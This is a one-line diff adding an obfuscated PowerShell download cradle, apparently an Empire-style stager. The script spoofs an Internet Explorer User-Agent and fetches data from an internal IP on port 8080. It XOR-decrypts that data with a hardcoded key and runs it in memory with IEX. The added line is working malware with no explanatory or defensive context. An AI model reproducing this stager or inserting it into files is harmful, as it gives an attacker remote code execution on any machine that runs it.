@@ -1,0 +1,1 @@
+$wC=NEW-ObJect SystEM.Net.WEBCLieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeADeRS.ADd('User-Agent',$u);$wc.ProXy = [SYsTEM.Net.WEbReQUeST]::DeFaultWEbPROxY;$K='g#!*7`DQ)AUHr&|]OE;>$W[3StyJ+,Z{';$I=0;[CHAr[]]$b=([ChaR[]]($Wc.DownLOadStRINg("http://172.16.102.93:8080/index.asp")))|%{$_-bXoR$K[$i++%$K.LEngth]};IEX ($b-JoIn'')
